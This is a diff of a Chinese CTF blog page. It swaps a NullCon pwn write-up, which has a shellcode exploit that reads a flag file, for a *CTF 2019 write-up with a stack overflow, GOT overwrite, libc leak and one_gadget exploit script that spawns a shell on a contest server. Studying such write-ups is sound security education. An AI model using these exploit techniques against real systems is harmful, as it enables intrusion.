@@ -2,28 +2,38 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>nullcon | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="nullcon | 风云阁">
+  <title>StarCTF | 风云阁</title>
+  <meta name="keywords" content=" Pwn , CTF ">
+  <meta name="description" content="StarCTF | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
+<meta name="description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AFL基础">
-<meta property="og:url" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="Defcon2019Q">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/index.html">
 <meta property="og:site_name" content="风云阁">
-<meta property="og:description" content="[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021513499-6493565.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021916706.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022711028.png">
-<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022730604.png">
-<meta property="article:published_time" content="2020-04-10T04:35:49.741Z">
-<meta property="article:modified_time" content="2020-04-10T04:40:24.139Z">
+<meta property="og:description" content="@[toc] Defcon Qual 2019 Pwn shitorrent题目描述  22个队伍做出来，这题还是有点难度的。看来作者写了一个消息传递的程序。 附件有可执行程序和源码。 分析程序    添加admin pc需要自己开启一个socket发送字符串 TORADMIN 。 所以我开启了两个网络程序。 import socket  from time import sleep  impor">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144618073.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145014084.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145057408.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145133505.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145207971.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145449340.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145541673.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145737954.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145839380.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144248741.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133959847.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133712725.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133700701.png">
+<meta property="article:published_time" content="2020-04-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-11T07:10:19.743Z">
 <meta property="article:author" content="枫云李">
-<meta property="article:tag" content="fuzz">
-<meta property="article:tag" content="afl">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Defcon">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
 
 
 <link rel="icon" href="/img/mac.png">
@@ -78,7 +88,15 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(18)</small></div></li>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            <li><div data-rel="CTF">CTF</div></li>
+        
+    
+        
+            <li><div data-rel="Fuzz">Fuzz</div></li>
+        
     
 </ul>
 <div class="left-bottom">
@@ -91,7 +109,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="18">
+<input type="hidden" id="yelog_site_posts_number" value="20">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -136,15 +154,15 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color4">CVE</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">Pwn</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CVE</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -165,7 +183,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class=""
+        <a  class="CTF "
+           href="/2020/04/11/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-11 00:00:00">2020/04/11</span>
+        </a>
+        
+        <a  class="Fuzz "
            href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
            data-tag="fuzz,afl"
            data-author="" >
@@ -174,35 +200,43 @@
         </a>
         
         <a  class=""
-           href="/2020/04/09/Defcon2019Q/"
-           data-tag="Pwn,CTF,Defcon"
-           data-author="" >
-            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
-            <span class="post-date" title="2020-04-09 00:00:00">2020/04/09</span>
-        </a>
-        
-        <a  class=""
            href="/2020/04/05/CVEs/"
-           data-tag="CVE,Pwn"
+           data-tag="Pwn,CVE"
            data-author="" >
             <span class="post-title" title="CVEs">CVEs</span>
             <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
         </a>
         
-        <a  class=""
-           href="/2020/04/01/hello-world/"
+        <a  class="CTF "
+           href="/2020/02/10/NullConCTF2020/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2020-04-01 23:49:33">2020/04/01</span>
+            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
         </a>
         
-        <a  class=""
-           href="/2020/02/10/nullcon/"
+        <a  class="CTF "
+           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="nullcon">nullcon</span>
-            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+            <span class="post-title" title="强网杯2019">强网杯2019</span>
+            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/N1CTF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019">安洵杯2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
         </a>
         
         <a  class=""
@@ -219,6 +253,14 @@
            data-author="" >
             <span class="post-title" title="heap_details">heap_details</span>
             <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/10/12/RoarCTF-2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
+            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
         </a>
         
         <a  class=""
@@ -251,14 +293,6 @@
            data-author="" >
             <span class="post-title" title="git handbook">git handbook</span>
             <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
-        </a>
-        
-        <a  class=""
-           href="/2019/05/26/QWB/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="QWB">QWB</span>
-            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
         </a>
         
         <a  class=""
@@ -301,11 +335,11 @@
             <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
         </a>
         
-        <a  class=""
-           href="/2019/04/29/star_ctf/"
-           data-tag=""
+        <a  class="CTF "
+           href="/2019/04/29/StarCTF/"
+           data-tag="Pwn,CTF"
            data-author="" >
-            <span class="post-title" title="star_ctf">star_ctf</span>
+            <span class="post-title" title="StarCTF">StarCTF</span>
             <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
         </a>
         
@@ -321,19 +355,33 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-nullcon" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-StarCTF" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">nullcon</h1>
+        <h1 class="article-title">StarCTF</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">Pwn</a>
+            
+            <a class="color4">CTF</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-11 22:26:35'>2020-02-10 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-11 01:13:45'>2019-04-29 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -355,7 +403,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NULLCON-CTF-Pwn"><span class="toc-text">NULLCON CTF Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-text">Note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing"><span class="toc-text">Reversing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF2019"><span class="toc-text">*CTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#check"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#check-1"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought-1"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-1"><span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -371,142 +419,165 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="NULLCON-CTF-Pwn"><a href="#NULLCON-CTF-Pwn" class="headerlink" title="NULLCON CTF Pwn"></a>NULLCON CTF Pwn</h1><p>一道关闭<code>stdout</code> 的漏洞利用题。</p>
-<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p><code>stdin, stdout, stderr</code> 是 <code>libc</code> 的三个标准文件的指针，指向的数据结构是<code>_IO_FILE</code>，只有引用了，这些符号才出现在ELF中。<code>_IO_FILE._fileno</code> 的值是文件描述符 <code>fd</code>，三个标准文件对应的 <code>fd</code> 是 <code>0 1 2</code></p>
-<p><code>fd</code> 是文件描述符。 程序引用文件，文件和 <code>fd</code> 绑定。<code>fd=0</code> 的关联文件可以通过命令<code>file /proc/pid/fd/0</code>查看。<code>0 1 2</code> 关联的文件均是 <code>/dev/pts/xx</code>。 <code>/dev/pts/xx</code>是当前会话终端设备文件。</p>
-<h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h2><ol>
-<li>申请4页内存，权限<code>rwx</code></li>
-<li>在<code>v6</code> 写入字节</li>
-<li><code>child_do</code> 参数为函数指针。</li>
-</ol>
-<pre><code>int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
-{
-  __int16 v3; // ax
-  __int16 v4; // ax
-  __pid_t v5; // [rsp+24h] [rbp-3Ch]
-  _BYTE *v6; // [rsp+38h] [rbp-28h]
+        <h1 id="CTF2019"><a href="#CTF2019" class="headerlink" title="*CTF2019"></a>*CTF2019</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><h4 id="Thought"><a href="#Thought" class="headerlink" title="Thought"></a>Thought</h4><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>###quicksort</p>
+<h4 id="check-1"><a href="#check-1" class="headerlink" title="check"></a>check</h4><pre><code class="shell">checksec quicksort
+[*] &#39;/ctf/work/star/quicksort/quicksort&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+<pre><code class="c">check ida
 
-  v3 = getpagesize();
-  v6 = mmap(0LL, ~(v3 - 1) &amp; 0x4000, 7, 34, -1, 0LL);
-  if ( !v6 )
-    __assert_fail(&quot;psc != NULL&quot;, &quot;chall.c&quot;, 0x5Cu, &quot;int main(int, char **)&quot;);
-  fflush(stdout);
-  v4 = getpagesize();
-  v6[(signed int)read(0, v6, ~(v4 - 1) &amp; 0x4000)] = 0xC3u;
-  v5 = fork();
-  if ( v5 &lt; 0 )
-    perror(&quot;fork&quot;);
-  if ( v5 &gt; 0 )
+
+unsigned int main2()
+{
+  int *v0; // ebx
+  char s; // [esp+Ch] [ebp-2Ch]
+  char v3; // [esp+Dh] [ebp-2Bh]
+  char v4; // [esp+Eh] [ebp-2Ah]
+  char v5; // [esp+Fh] [ebp-29h]
+  char v6; // [esp+10h] [ebp-28h]
+  char v7; // [esp+11h] [ebp-27h]
+  char v8; // [esp+12h] [ebp-26h]
+  char v9; // [esp+13h] [ebp-25h]
+  char v10; // [esp+14h] [ebp-24h]
+  char v11; // [esp+15h] [ebp-23h]
+  char v12; // [esp+16h] [ebp-22h]
+  char v13; // [esp+17h] [ebp-21h]
+  char v14; // [esp+18h] [ebp-20h]
+  char v15; // [esp+19h] [ebp-1Fh]
+  char v16; // [esp+1Ah] [ebp-1Eh]
+  char v17; // [esp+1Bh] [ebp-1Dh]
+  int v18; // [esp+1Ch] [ebp-1Ch]
+  int i; // [esp+20h] [ebp-18h]
+  int j; // [esp+24h] [ebp-14h]
+  void *ptr; // [esp+28h] [ebp-10h]
+  unsigned int v22; // [esp+2Ch] [ebp-Ch]
+
+  v22 = __readgsdword(0x14u);
+  v3 = 0;
+  v4 = 0;
+  v5 = 0;
+  v6 = 0;
+  v7 = 0;
+  v8 = 0;
+  v9 = 0;
+  v10 = 0;
+  v11 = 0;
+  v12 = 0;
+  v13 = 0;
+  v14 = 0;
+  v15 = 0;
+  v16 = 0;
+  v17 = 0;
+  s = 0;
+  v18 = 0;
+  puts(&quot;how many numbers do you want to sort?&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v18);
+  getchar();
+  ptr = malloc(4 * v18);
+  for ( i = 0; i &lt; v18; ++i )
   {
-    wait(0LL);
-    exit(0);
+    printf(&quot;the %dth number:&quot;, i + 1);
+    gets(&amp;s);
+    v0 = (int *)((char *)ptr + 4 * i);
+    *v0 = atoi(&amp;s);
   }
-  child_do((void (__fastcall *)(_QWORD, signed __int64))v6);</code></pre><ol>
-<li>关闭 <code>stdin stdout stderr</code> </li>
-<li>将 <code>/dev/null</code> 设备(device)  映射到 <code>fd 0 1 2</code></li>
-<li>参数<code>a1</code> 任意代码执行。</li>
-</ol>
-<pre><code>void __fastcall __noreturn child_do(void (__fastcall *a1)(_QWORD, signed __int64))
-{
-  unsigned int fd; // ST24_4
-
-  fclose(stdin);
-  fclose(stdout);
-  fclose(stderr);
-  fd = open(&quot;/dev/null&quot;, 2);
-  dup2(fd, 0);
-  dup2(fd, 1);
-  dup2(fd, 2);
-  a1(fd, 2LL);
-  exit(0);
-}</code></pre><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><ol>
-<li><p><code>open(&quot;/dev/pts/5&quot;,2); fd=3</code></p>
+  sort1((int)ptr, 0, v18 - 1);
+  puts(&quot;Here is the result:&quot;);
+  for ( j = 0; j &lt; v18; ++j )
+    printf(&quot;%d &quot;, *((_DWORD *)ptr + j));
+  puts(&amp;byte_8048AD2);
+  free(ptr);
+  return __readgsdword(0x14u) ^ v22;
+}</code></pre>
+<h4 id="Thought-1"><a href="#Thought-1" class="headerlink" title="Thought"></a>Thought</h4><ul>
+<li><input checked disabled type="checkbox"> <p>字符数组的s溢出可以覆盖ptr, i, j 。</p>
 </li>
-<li><p><code>open(&quot;./flag&quot;,1); fd=4</code></p>
+<li><input checked disabled type="checkbox"> <p>改free_got到main_txt，目的用于重复输入</p>
 </li>
-<li><p><code>read(4,flag,0x20);</code></p>
+<li><input checked disabled type="checkbox"> <p>利用printf(“%d”)来泄漏 函数在got表的真实地址，得到libc基地址</p>
 </li>
-<li><p>``write(3,flag,0x20);`</p>
+<li><input checked disabled type="checkbox"> <p>one_gadget寻找execv</p>
 </li>
-</ol>
-<pre><code class="python">   #! env /usr/bin/python
-   #coding=utf8
-   from pwn import * 
+<li><input checked disabled type="checkbox"> <pre><code class="shell">0x3ac5c execve(&quot;/bin/sh&quot;, esp+0x28, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x28] == NULL
 
-   pr=process(&#39;./chall&#39;)
-   context.arch=&#39;amd64&#39;
+0x3ac5e execve(&quot;/bin/sh&quot;, esp+0x2c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x2c] == NULL
 
+0x3ac62 execve(&quot;/bin/sh&quot;, esp+0x30, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x30] == NULL</code></pre>
+</li>
+<li><input checked disabled type="checkbox"> <p>修改free_got到one,然后成功pwn掉。</p>
+</li>
+</ul>
+<pre><code class="sehll">root@prime:/ctf/work/star/quicksort# ./p.py 
+[+] Opening connection to 34.92.96.238 on port 10000: Done
+[+] -136733602
+[*] Switching to interactive mode
+Here is the result:
 
+$ ls
+chall
+flag
+pwn
+$ cat flag
+*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}</code></pre>
+<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><pre><code class="python">#!/usr/bin/env python
+from pwn import *
+import ctypes
+#p = process(&#39;./quicksort&#39;)
+#nc 34.92.96.238 10000
+p = remote(&#39;34.92.96.238&#39;,10000)
 
-   def pdbg(p,init=&#39;&#39;,syms=None):
-       context.terminal=[&#39;tmux&#39;,&#39;split&#39;,&#39;-h&#39;]
-       dbg_syms=syms
-       int_cmds=init
-       if syms!=None:
-           for each in dbg_syms.keys():
-               int_cmds+=&#39;set $&#39;+each+&#39;=&#39;+str(dbg_syms[each])+&#39;\n&#39;
-               print(each,str(dbg_syms[each]))
-       gdb.attach(pr,int_cmds)
+debug = 0
+if debug:
+    context.log_level = &#39;debug&#39;    
+    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+    gdb.attach(p)
 
-   #pdbg(pr,&#39;b *0x00400A14&#39;)
+libc_start_got = 0x804a030
+#[0x804a018] free
+main2_addr = 0x8048816 #134514710
+free_got = 0x804a018
+puts_got = 0x804a02c
 
-   # stdout-&gt;_fileno=1;
-   # stdout-&gt;_flags=0xfbad2084;
-   #open(&quot;/dev/pts/5&quot;,2); fd=3
-   #open(&quot;./flag&quot;,1); fd=4
-   #read(4,flag,0x20);
-   #write(3,flag,0x20);
-
-   #    0x40081a &lt;test10+19&gt;    mov    rax, qword ptr [rip + 0x20085f] &lt;0x601080&gt;
-   #  ► 0x400821 &lt;test10+26&gt;    mov    dword ptr [rax + 0x70], 1 &lt;0x7ffff7dd07d0&gt;
-   #    0x400828 &lt;test10+33&gt;    mov    rax, qword ptr [rip + 0x200851] &lt;0x601080&gt;
-   #    0x40082f &lt;test10+40&gt;    mov    dword ptr [rax], 0xfbad2084
-
-   stdout=0x06010A0
-   open_got=0x601050
-   write_got=0x601018 
-
-   def Pasm(cmds):
-       res=&#39;&#39;
-       for each in cmds:
-           res += asm(each)
-       return res
-
-   payload = Pasm(
-       [
-           &#39;mov rdx, 0x00352f&#39;,#open(&quot;/dev/pts/5&quot;,2); fd=3
-           &#39;push rdx&#39;,
-           &#39;mov rdx, 0x7374702f7665642f&#39;,
-           &quot;push rdx&quot;,
-           &#39;mov rdi,rsp&#39;,
-           &#39;mov rsi,2&#39;,
-           &quot;mov rax,qword ptr[0x601050]&quot;,
-           &quot;call rax&quot; ,
-
-           &#39;mov rdx,0x067616c662f2e&#39;,
-           &#39;push rdx&#39;,
-           &#39;mov rdi,rsp&#39;,
-           &#39;mov rsi,0&#39;,
-           &#39;mov rax,qword ptr[0x601050]&#39;,
-           &quot;call rax&quot;,
-
-           &#39;mov rdx,0x20&#39;,
-           &#39;mov rdi,0x4&#39;,
-           &#39;mov rsi,0x6015a0&#39;,
-           &#39;mov rax,qword ptr[0x601040]&#39;,
-           &#39;call rax&#39;,
-
-           &#39;mov rsi,0x6015a0&#39;,
-           &#39;mov rdi, 3&#39;,
-           &#39;mov rdx,0x20&#39;,
-           &#39;mov rax,qword ptr[0x601018]&#39;,
-           &#39;call rax&#39;
-       ]
-   )
+puts_plt = 0x8048560  #134514016
+printf_plt = 0x80484f0 #134513904
+puts_libc = 0x5fca0
+one = 0x3ac5e#0x3ac62
 
 
-   pr.send(payload)
-   pr.interactive()</code></pre>
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(main2_addr)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(0)+p32(0)+p32(free_got)
+p.sendlineafter(&#39;number:&#39;,pay)
+
+
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(printf_plt)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(1)+p32(0)+p32(puts_got)
+p.sendlineafter(&#39;number:&#39;,pay)
+
+p.recvline()
+x = ctypes.c_uint(int(p.recvline())).value
+one_real = x + one-puts_libc
+one_real = ctypes.c_int(one_real).value
+#print len(str(one_real))
+log.success(one_real)
+
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(one_real)+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(0)+p32(0)+p32(0)+p32(free_got)#+&#39;\x00&#39;*100
+p.sendlineafter(&#39;number:&#39;,pay)
+
+p.interactive()</code></pre>
+<p>x</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -516,12 +587,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>nullcon</p>
+    <p><span class="copy-title">文章标题:</span>StarCTF</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-10, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-11, 22:26:35</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/10/nullcon/" title="nullcon">https://primelyw.github.io/2020/02/10/nullcon/</a>
+    <p><span class="copy-title">发布时间:</span>2019-04-29, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-11, 01:13:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/04/29/StarCTF/" title="StarCTF">https://primelyw.github.io/2019/04/29/StarCTF/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
@@ -565,7 +636,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#CVE','#Pwn','#CTF','#Defcon','#fuzz','#afl',],
+            'data': ['#Pwn','#CTF','#CVE','#Defcon','#fuzz','#afl',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
@@ -649,53 +720,6 @@
 
 <!--自定义样式设置-->
 <style>
-    
-    
-    .nav {
-        width: 542px;
-    }
-    .nav.fullscreen {
-        margin-left: -542px;
-    }
-    .nav-left {
-        width: 120px;
-    }
-    
-    
-    @media screen and (max-width: 1468px) {
-        .nav {
-            width: 492px;
-        }
-        .nav.fullscreen {
-            margin-left: -492px;
-        }
-        .nav-left {
-            width: 100px;
-        }
-    }
-    
-    
-    @media screen and (max-width: 1024px) {
-        .nav {
-            width: 492px;
-            margin-left: -492px
-        }
-        .nav.fullscreen {
-            margin-left: 0;
-        }
-        .nav .hide-list.fullscreen {
-            left: 492px
-        }
-    }
-    
-    @media screen and (max-width: 426px) {
-        .nav {
-            width: 100%;
-        }
-        .nav-left {
-            width: 100%;
-        }
-    }
     
     
     .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
